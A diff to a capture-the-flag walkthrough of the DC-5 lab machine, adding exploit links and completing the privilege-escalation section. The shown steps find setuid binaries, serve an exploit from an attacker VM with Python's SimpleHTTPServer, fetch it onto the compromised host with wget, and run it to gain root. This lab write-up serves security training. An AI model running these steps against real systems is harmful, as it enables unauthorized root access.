@@ -54,7 +54,7 @@ By DCAU
 * Next, run `find / -user root -perm -4000 -print 2>/dev/null` to search for setuid binaries which we can possibly exploit:
 ![](/screenshots/dc-5/setuidBinaries.jpg)
 * Having executed this `find` command many times over our past challenges, we are more or less able to distinguish if there are any unusual binaries in the output. Here, it is `/bin/screen-4.5.0`.
-* Googling about /bin/screen-4.5.0 led me to find out about the existence of 2 exploits relating to it on Exploit DB - 41152 and 41154. I could not quite understand the former, so we will use the latter.
+* Googling about /bin/screen-4.5.0 led me to find out about the existence of 2 exploits relating to it on Exploit DB - [41152](https://www.exploit-db.com/exploits/41152) and [41154](https://www.exploit-db.com/exploits/41154). I could not quite understand the former, so we will use the latter.
 * To upload the exploit script, run `python -m SimpleHTTPServer 4567` on our Kali VM, then navigate to `/tmp` on our netcat shell before running `wget http://10.0.2.4:4567/41154.sh`:
 ![](/screenshots/dc-5/uploadExploitScript.jpg)
 * Note: According to [Python For Beginners](https://www.pythonforbeginners.com/modules-in-python/how-to-use-simplehttpserver/), the SimpleHTTPServer module that comes with Python is a simple HTTP server that provides standard GET and HEAD request handlers. An advantage with the built-in HTTP server is that we do not have to install and configure anything.
@@ -81,7 +81,12 @@ By DCAU
 * The status code `200 OK` tells us that the upload is successful.
 * `chmod +x screenroot.sh` to give it executable permissions:
 ![](/screenshots/dc-5/filesInTmpDirectory.jpg)
-* To-be-continued...
+* For some unknown reason, I am unable to run it on one of my devices. Apparently there is a wrong ELF class, which I am unable to diagnose:
+![](/screenshots/dc-5/exploitFinalUnknownFailure.jpg)
+* What you should rightfully see when you run `./screenroot.sh`:
+![](/screenshots/dc-5/privilegeEscalated.jpg)
+* Congratulations, we are now `root`! Head to `/root`, and our flag is found in `thisistheflag.txt`:
+![](/screenshots/dc-5/flag.jpg)
 
 # Other walkthroughs visited
 1. https://bzyo.github.io/dc-5/
